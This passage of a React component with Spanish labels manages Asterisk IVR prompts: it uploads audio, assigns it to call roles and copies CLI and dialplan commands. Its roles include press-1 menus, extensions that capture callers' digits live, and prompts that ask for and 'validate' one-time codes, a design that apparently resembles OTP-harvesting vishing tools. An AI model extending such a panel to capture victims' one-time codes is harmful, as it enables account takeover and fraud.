                    <span>Escuchar</span>
                  </button>

                  <button
                    onClick={() => handleDeactivateRole('welcome_3333')}
                    disabled={isSyncingRole.welcome_3333}
                    className="px-2.5 py-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-slate-700 hover:border-rose-500/30 text-xs font-semibold flex items-center gap-1"
                    title="Desactivar audio actual y restaurar locución predeterminada para la 3333"
                  >
                    <PowerOff className="w-3.5 h-3.5" />
                    <span className="hidden sm:inline">Desactivar</span>
                  </button>
                </div>

                <div className="flex items-center justify-between text-[11px] text-slate-400">
                  <span className="flex items-center gap-1.5 text-emerald-400">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>AstDB: ivr_vars 3333_intro y ivr_vars 3333_prompt</span>
                  </span>
                  <span className="text-slate-400">Captura hasta 10 dígitos + tecla #</span>
                </div>
              </div>

              <div
                onDragOver={(e) => {
                  e.preventDefault();
                  setIsDragging(true);
                }}
                onDragLeave={() => setIsDragging(false)}
                onDrop={(e) => {
                  e.preventDefault();
                  setIsDragging(false);
                  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                    handleUpload3333Direct(e.dataTransfer.files[0]);
                  }
                }}
                onClick={() => ext3333FileInputRef.current?.click()}
                className="p-4 rounded-xl border-2 border-dashed border-pink-500/40 bg-pink-950/20 hover:bg-pink-950/40 hover:border-pink-400 transition-all flex flex-col items-center justify-center text-center cursor-pointer space-y-1.5"
              >
                <UploadCloud className="w-6 h-6 text-pink-400" />
                <div className="text-xs font-bold text-white">Arrastra el audio de la 3333 aquí</div>
                <p className="text-[10px] text-pink-300/70 leading-tight">
                  WAV o MP3. Se optimiza y activa en caliente en Asterisk al instante.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* SECTION 2: MATRIZ DE ASIGNACIÓN EN VIVO (CAMBIAR AUDIOS EN 1 CLIC) */}
      <div className="p-5 rounded-xl bg-slate-900 border border-slate-800 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-800">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
              <Sliders className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-sm font-bold text-white">
                Centro de Control de Mensajes Pregrabados (En Vivo en Asterisk)
              </h3>
              <p className="text-xs text-slate-400">
                Selecciona cualquier audio de tu biblioteca para cambiar al instante lo que Asterisk reproduce en cada etapa de la llamada.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-1.5 self-start sm:self-auto bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
            <button
              onClick={() => setFilterCategory('all')}
              className={`px-2.5 py-1 rounded transition-colors ${
                filterCategory === 'all'
                  ? 'bg-emerald-500 text-black font-bold'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              Todos ({SYSTEM_ROLES.length})
            </button>
            <button
              onClick={() => setFilterCategory('otp')}
              className={`px-2.5 py-1 rounded transition-colors ${
                filterCategory === 'otp'
                  ? 'bg-purple-500 text-white font-bold'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              Exts OTP (9)
            </button>
            <button
              onClick={() => setFilterCategory('press1')}
              className={`px-2.5 py-1 rounded transition-colors ${
                filterCategory === 'press1'
                  ? 'bg-emerald-500 text-black font-bold'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              Press 1 (3)
            </button>
          </div>
        </div>

        {/* Roles Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {filteredRoles.map((roleConf) => {
            const Icon = roleConf.icon;
            const currentAudioPath = activeAssignments[roleConf.role] || roleConf.fallbackDefault;
            const isSyncing = !!isSyncingRole[roleConf.role];
            const matchedAudio = audios.find((a) => a.asteriskPath === currentAudioPath.replace(/\.wav$/, ''));
            const isPlayingCurrent = matchedAudio && playingAudioId === matchedAudio.id;

            return (
              <div
                key={roleConf.role}
                className={`p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 ${
                  roleConf.role === 'welcome_7777'
                    ? 'bg-gradient-to-br from-purple-950/30 to-slate-950 border-purple-500/40 shadow-md'
                    : roleConf.role === 'welcome_6666'
                    ? 'bg-gradient-to-br from-cyan-950/30 to-slate-950 border-cyan-500/40 shadow-md'
                    : 'bg-slate-950/70 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div>
                  <div className="flex items-start justify-between gap-2 mb-2">
                    <div className="flex items-center gap-2">
                      <div className="w-7 h-7 rounded-md bg-slate-800 flex items-center justify-center text-slate-300">
                        <Icon className="w-4 h-4 text-emerald-400" />
                      </div>
                      <div>
                        <h4 className="font-semibold text-white text-xs leading-snug">
                          {roleConf.title}
                        </h4>
                      </div>
                    </div>
                    <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full border shrink-0 ${roleConf.badgeColor}`}>
                      {roleConf.badge}
                    </span>
                  </div>

                  <p className="text-[11px] text-slate-400 leading-relaxed">
                    {roleConf.description}
                  </p>
                </div>

                {/* Current assignment & Selector */}
                <div className="space-y-2 pt-2 border-t border-slate-800/80">
                  <div className="flex items-center justify-between text-[11px]">
                    <span className="text-slate-400 font-medium">Audio actual en central:</span>
                    <span className="font-mono text-emerald-400 font-bold truncate max-w-[190px]">
                      {currentAudioPath}
                    </span>
                  </div>

                  <div className="flex items-center gap-2">
                    <select
                      value={currentAudioPath}
                      disabled={isSyncing}
                      onChange={(e) => handleAssignRoleDirect(roleConf.role, e.target.value)}
                      className="flex-1 px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-700 text-slate-200 text-xs font-mono focus:border-emerald-500 focus:outline-none"
                    >
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>

                    <button
                      onClick={() => handlePlayByPath(currentAudioPath)}
                      className={`p-2 rounded-lg transition-colors shrink-0 ${
                        isPlayingCurrent
                          ? 'bg-emerald-500 text-black shadow-md shadow-emerald-500/20 animate-pulse'
                          : 'bg-slate-800 hover:bg-slate-700 text-slate-200'
                      }`}
                      title="Escuchar audio actualmente asignado"
                    >
                      {isPlayingCurrent ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                    </button>

                    <button
                      onClick={() => handleDeactivateRole(roleConf.role)}
                      disabled={isSyncing}
                      className="p-2 rounded-lg bg-slate-800 hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-transparent hover:border-rose-500/30 transition-colors shrink-0"
                      title={`Desactivar audio personalizado y restaurar por defecto (${roleConf.fallbackDefault})`}
                    >
                      <PowerOff className="w-3.5 h-3.5" />
                    </button>

                    <button
                      onClick={() => {
                        setNewAudioCategory(roleConf.role as AudioPrompt['category']);
                        setNewAudioName(roleConf.title);
                        fileInputRef.current?.click();
                      }}
                      className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors shrink-0"
                      title={`Subir un nuevo audio directamente para: ${roleConf.title}`}
                    >
                      <UploadCloud className="w-3.5 h-3.5 text-emerald-400" />
                    </button>
                  </div>

                  {/* AstDB sync status & manual command copy */}
                  <div className="flex items-center justify-between text-[10px] text-slate-400 font-mono bg-slate-900/80 px-2 py-1 rounded">
                    <span className="truncate">AstDB: {roleConf.astDbKey} = "{currentAudioPath}"</span>
                    <button
                      onClick={() =>
                        copyToClipboard(`asterisk -rx 'database put ${roleConf.astDbKey} "${currentAudioPath}"'`)
                      }
                      className="text-slate-400 hover:text-emerald-400 p-0.5 ml-1 shrink-0"
                      title="Copiar comando CLI de Asterisk"
                    >
                      <Copy className="w-3 h-3" />
                    </button>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Drag & Drop Upload Zone (Guideline compliant: supports both drag-and-drop and click) */}
      <div
        onDragOver={(e) => {
          e.preventDefault();
          setIsDragging(true);
        }}
        onDragLeave={() => setIsDragging(false)}
        onDrop={handleFileDrop}
        onClick={() => fileInputRef.current?.click()}
        className={`border-2 border-dashed rounded-xl p-6 text-center cursor-pointer transition-all ${
          isDragging
            ? 'border-emerald-500 bg-emerald-500/10 scale-[1.01]'
            : 'border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700'
        }`}
      >
        <div className="flex flex-col items-center justify-center space-y-2 max-w-md mx-auto">
          <div className="w-12 h-12 rounded-xl bg-slate-800 flex items-center justify-center text-emerald-400 border border-slate-700">
            <UploadCloud className="w-6 h-6" />
          </div>
          <div className="text-sm font-medium text-white">
            Arrastra y suelta tu archivo de audio aquí o <span className="text-emerald-400 underline">haz clic para explorar</span>
          </div>
          <p className="text-xs text-slate-400 leading-relaxed">
            Formatos compatibles: <strong>WAV (16-bit 8000Hz PCM recomendado)</strong>, MP3, OGG, GSM. Asterisk reproducirá el archivo con máxima nitidez sin transcodificación.
          </p>
        </div>
      </div>

      {/* Section Title: Audioteca de Archivos */}
      <div className="flex items-center justify-between pt-2">
        <h3 className="text-base font-bold text-white flex items-center gap-2">
          <span>Biblioteca de Locuciones Disponibles</span>
          <span className="text-xs text-slate-400 font-normal">({audios.length} archivos en servidor)</span>
        </h3>
        <p className="text-xs text-slate-400 hidden sm:block">
          Usa los botones rápidos de cada tarjeta para asignar el audio a cualquier mensaje del sistema en 1 clic.
        </p>
      </div>

      {/* Audio Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {audios.map((audio) => {
          const isPlaying = playingAudioId === audio.id;
          const cat = categoryLabels[audio.category] || categoryLabels.custom;

          // Check which roles this audio is currently assigned to
          const assignedRoles = Object.entries(activeAssignments)
            .filter(([_, path]) => path === audio.asteriskPath || path === `custom/${audio.fileName.replace(/\.wav$/, '')}`)
            .map(([role]) => role as AudioRole);

          return (
            <div
              key={audio.id}
              className={`p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 ${
                assignedRoles.length > 0
                  ? 'bg-slate-900 border-emerald-500/40 shadow-md'
                  : 'bg-slate-900 border-slate-800 hover:border-slate-700'
              }`}
            >
              <div>
                {/* Card Header & Category Badge */}
                <div className="flex items-start justify-between gap-2 mb-2">
                  <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full border ${cat.color}`}>
                    {cat.label}
                  </span>
                  <button
                    onClick={() => onDeleteAudio(audio.id)}
                    className="p-1 rounded text-slate-500 hover:text-rose-400 hover:bg-slate-800 transition-colors"
                    title="Eliminar audio de la biblioteca"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>

                <h3 className="font-semibold text-white text-sm leading-snug">{audio.name}</h3>
                <p className="text-xs text-slate-400 font-mono mt-0.5">{audio.fileName}</p>

                {/* Active in Roles Badge */}
                {assignedRoles.length > 0 && (
                  <div className="mt-2 flex items-center gap-1.5 flex-wrap">
                    <span className="text-[10px] text-emerald-400 font-semibold">Activo en:</span>
                    {assignedRoles.map((r) => {
                      const rConf = SYSTEM_ROLES.find((sr) => sr.role === r);
                      return (
                        <span
                          key={r}
                          className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 flex items-center gap-1"
                        >
                          <span>✓</span>
                          <span>{rConf?.badge || r}</span>
                        </span>
                      );
                    })}
                  </div>
                )}
              </div>

              {/* Audio Player & Waveform simulation */}
              <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                <div className="flex items-center justify-between">
                  <button
                    onClick={() => handlePlayToggle(audio)}
                    className={`p-2 rounded-full flex items-center justify-center transition-all ${
                      isPlaying
                        ? 'bg-emerald-500 text-black shadow-md shadow-emerald-500/30 animate-pulse'
                        : 'bg-slate-800 text-white hover:bg-slate-700'
                    }`}
                    title={isPlaying ? 'Pausar' : 'Reproducir locución'}
                  >
                    {isPlaying ? <Pause className="w-4 h-4" /> : <Play className="w-4 h-4 ml-0.5" />}
                  </button>

                  <div className="flex-1 px-3">
                    <div className="flex items-center gap-0.5 h-6">
                      {[40, 75, 50, 90, 60, 30, 85, 45, 95, 70, 50, 80, 65, 35, 75, 55, 90, 40].map(
                        (height, idx) => (
                          <div
                            key={idx}
                            className={`flex-1 rounded-full transition-all ${
                              isPlaying ? 'bg-emerald-400 animate-pulse' : 'bg-slate-700'
                            }`}
                            style={{ height: `${isPlaying ? height : Math.max(20, height * 0.5)}%` }}
                          ></div>
                        )
                      )}
                    </div>
                  </div>

                  <span className="text-xs font-mono font-medium text-slate-400">
                    {audio.durationSec}s
                  </span>
                </div>

                {/* File Specs */}
                <div className="flex justify-between text-[11px] text-slate-400 font-mono pt-1 border-t border-slate-800/80">
                  <span>{audio.fileSize}</span>
                  <span className="truncate max-w-[170px]">{audio.sampleRate}</span>
                </div>
              </div>

              {/* Dialplan / Asterisk Path Reference */}
              <div className="text-[11px] bg-slate-950/60 p-2 rounded border border-slate-800 flex items-center justify-between text-slate-300 font-mono">
                <span className="text-slate-400">Playback({audio.asteriskPath})</span>
                <button
                  onClick={() => copyToClipboard(`Playback(${audio.asteriskPath})`)}
                  className="text-slate-400 hover:text-emerald-400 p-0.5"
                  title="Copiar sintaxis para extensions.conf"
                >
                  <Copy className="w-3.5 h-3.5" />
                </button>
              </div>

              {/* Action Assignment buttons (1-Click Change) */}
              <div className="pt-2 border-t border-slate-800 space-y-1.5">
                <span className="text-[10px] text-slate-400 font-medium block">Asignar en 1 clic como:</span>
                <div className="flex items-center gap-1.5 flex-wrap">
                  <button
                    onClick={() => {
                      if (activeAssignments.welcome_7777 === audio.asteriskPath) {
                        handleDeactivateRole('welcome_7777');
                      } else {
                        handleAssignRoleDirect('welcome_7777', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.welcome_7777 === audio.asteriskPath
                        ? 'bg-purple-500 text-white font-bold shadow-sm shadow-purple-500/20 hover:bg-purple-600'
                        : 'bg-purple-500/10 text-purple-300 border border-purple-500/20 hover:bg-purple-500/20'
                    }`}
                    title={activeAssignments.welcome_7777 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 7777"}
                  >
                    <Sparkles className="w-3 h-3" />
                    <span>Ext 7777</span>
                    {activeAssignments.welcome_7777 === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.welcome_6666 === audio.asteriskPath) {
                        handleDeactivateRole('welcome_6666');
                      } else {
                        handleAssignRoleDirect('welcome_6666', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.welcome_6666 === audio.asteriskPath
                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
                        : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
                    }`}
                    title={activeAssignments.welcome_6666 === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida de la extensión 6666"}
                  >
                    <Sparkles className="w-3 h-3 text-cyan-300" />
                    <span>Ext 6666</span>
                    {activeAssignments.welcome_6666 === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.press1_welcome === audio.asteriskPath) {
                        handleDeactivateRole('press1_welcome');
                      } else {
                        handleAssignRoleDirect('press1_welcome', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.press1_welcome === audio.asteriskPath
                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20 hover:bg-emerald-600'
                        : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
                    }`}
                    title={activeAssignments.press1_welcome === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como bienvenida inicial de Press 1"}
                  >
                    <span>Intro Press 1</span>
                    {activeAssignments.press1_welcome === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.agent_transfer === audio.asteriskPath) {
                        handleDeactivateRole('agent_transfer');
                      } else {
                        handleAssignRoleDirect('agent_transfer', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.agent_transfer === audio.asteriskPath
                        ? 'bg-amber-500 text-black font-bold shadow-sm shadow-amber-500/20 hover:bg-amber-600'
                        : 'bg-amber-500/10 text-amber-300 border border-amber-500/20 hover:bg-amber-500/20'
                    }`}
                    title={activeAssignments.agent_transfer === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar a la transferencia hacia el asesor (al pulsar 1)"}
                  >
                    <span>Asesor (1)</span>
                    {activeAssignments.agent_transfer === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_welcome === audio.asteriskPath) {
                        handleDeactivateRole('otp_welcome');
                      } else {
                        handleAssignRoleDirect('otp_welcome', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_welcome === audio.asteriskPath
                        ? 'bg-blue-500 text-white font-bold shadow-sm shadow-blue-500/20 hover:bg-blue-600'
                        : 'bg-blue-500/10 text-blue-300 border border-blue-500/20 hover:bg-blue-500/20'
                    }`}
                    title={activeAssignments.otp_welcome === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como locución de solicitud de código OTP"}
                  >
                    <span>Pedir OTP</span>
                    {activeAssignments.otp_welcome === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_wait === audio.asteriskPath) {
                        handleDeactivateRole('otp_wait');
                      } else {
                        handleAssignRoleDirect('otp_wait', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_wait === audio.asteriskPath
                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
                        : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
                    }`}
                    title={activeAssignments.otp_wait === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio en espera durante la validación del código"}
                  >
                    <span>Espera OTP</span>
                    {activeAssignments.otp_wait === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_success === audio.asteriskPath) {
                        handleDeactivateRole('otp_success');
                      } else {
                        handleAssignRoleDirect('otp_success', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_success === audio.asteriskPath
                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20 hover:bg-emerald-600'
                        : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
                    }`}
                    title={activeAssignments.otp_success === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio de código validado con éxito"}
                  >
                    <span>Éxito</span>
                    {activeAssignments.otp_success === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>

                  <button
                    onClick={() => {
                      if (activeAssignments.otp_failure === audio.asteriskPath) {
                        handleDeactivateRole('otp_failure');
                      } else {
                        handleAssignRoleDirect('otp_failure', audio.asteriskPath);
                      }
                    }}
                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
                      activeAssignments.otp_failure === audio.asteriskPath
                        ? 'bg-rose-500 text-white font-bold shadow-sm shadow-rose-500/20 hover:bg-rose-600'
                        : 'bg-rose-500/10 text-rose-300 border border-rose-500/20 hover:bg-rose-500/20'
                    }`}
                    title={activeAssignments.otp_failure === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio de código inválido / reintento"}
                  >
                    <span>Fallo</span>
                    {activeAssignments.otp_failure === audio.asteriskPath && <span>✓ (Activo)</span>}
                  </button>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Modal: Confirmación de subida y metadatos del audio */}
      {isUploadModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-xl bg-slate-900 border border-slate-800 p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-800">
              <h3 className="text-lg font-bold text-white flex items-center gap-2">
                <Volume2 className="w-5 h-5 text-emerald-400" />
                <span>Registrar Audio en Asterisk</span>
              </h3>
              <button
                onClick={() => setIsUploadModalOpen(false)}
                className="text-slate-400 hover:text-white text-lg font-mono"
              >
                &times;
              </button>
            </div>

            <form onSubmit={handleSaveAudio} className="space-y-4 text-xs">
              <div>
                <label className="block text-slate-300 font-medium mb-1">
                  Nombre descriptivo del audio *
                </label>
                <input
                  type="text"
                  required
                  value={newAudioName}
                  onChange={(e) => setNewAudioName(e.target.value)}
                  placeholder="Ej: Bienvenida Campaña Cobranzas"
                  className="w-full px-3 py-2 rounded-md bg-slate-950 border border-slate-800 text-white focus:border-emerald-500 focus:outline-none text-xs"
                />
              </div>

              <div>
                <label className="block text-slate-300 font-medium mb-1">
                  Mensaje o Rol en la Central Telefónica
                </label>
                <select
                  value={newAudioCategory}
                  onChange={(e) => setNewAudioCategory(e.target.value as AudioPrompt['category'])}
                  className="w-full px-3 py-2 rounded-md bg-slate-950 border border-slate-800 text-white focus:border-emerald-500 focus:outline-none text-xs"
                >
                  <option value="welcome_7777">Bienvenida Extensión 7777 (Captura en Vivo)</option>
                  <option value="welcome_6666">Bienvenida Extensión 6666 (Captura en Vivo)</option>
                  <option value="welcome_5555">Bienvenida Extensión 5555 (Captura en Vivo)</option>
                  <option value="welcome_4444">Bienvenida Extensión 4444 (Captura en Vivo)</option>
                  <option value="welcome_3333">Bienvenida Extensión 3333 (Captura en Vivo)</option>
                  <option value="press1_welcome">Bienvenida IVR Press 1 (Al contestar llamada)</option>
                  <option value="agent_transfer">Transferencia a Asesor ("Un momento por favor...")</option>
                  <option value="press1_invalid">Opción Inválida en Menú Press 1</option>
                  <option value="otp_welcome">Solicitud Dígitos OTP ("Ingrese su código...")</option>
                  <option value="otp_wait">Validación en Espera ("Validando información...")</option>
                  <option value="otp_success">Validación Correcta ("Operación asegurada")</option>
                  <option value="otp_failure">Código Inválido ("Token incorrecto, reintente")</option>
                  <option value="hold_music">Música en Espera (MOH)</option>
                  <option value="custom">Anuncio / General</option>
                </select>
              </div>

              {/* Auto activate checkbox */}
              {newAudioCategory !== 'custom' && newAudioCategory !== 'hold_music' && (
                <label className="flex items-center gap-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={autoActivateRole}
                    onChange={(e) => setAutoActivateRole(e.target.checked)}
                    className="rounded border-slate-700 text-emerald-500 focus:ring-0"
                  />
                  <span className="text-emerald-300 text-[11px] font-medium">
                    Activar inmediatamente como el audio en vivo para este rol en Asterisk
                  </span>
                </label>
              )}

              <div className="p-3 rounded bg-slate-950 border border-slate-800 text-slate-400 space-y-1">
                <div className="flex justify-between">
                  <span>Archivo:</span>
                  <span className="font-mono text-slate-200 truncate max-w-[200px]">{stagedFileName}</span>
                </div>
                <div className="flex justify-between">
                  <span>Tamaño:</span>
                  <span className="font-mono text-slate-200">{stagedFileSize}</span>
                </div>
                <div className="flex justify-between">
                  <span>Duración estimada:</span>
                  <span className="font-mono text-emerald-300">{stagedDuration} segundos</span>
                </div>
              </div>

              <div className="p-2.5 rounded bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-[11px]">
                💡 El servidor convertirá automáticamente este archivo a <strong>8000Hz 16-bit Mono PCM</strong> y lo guardará en <code className="font-mono">/var/lib/asterisk/sounds/custom/</code>.
              </div>

              <div className="flex justify-end space-x-2 pt-2 border-t border-slate-800">
                <button
                  type="button"
                  onClick={() => setIsUploadModalOpen(false)}
                  className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-bold"
                >
                  Guardar y Sincronizar
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
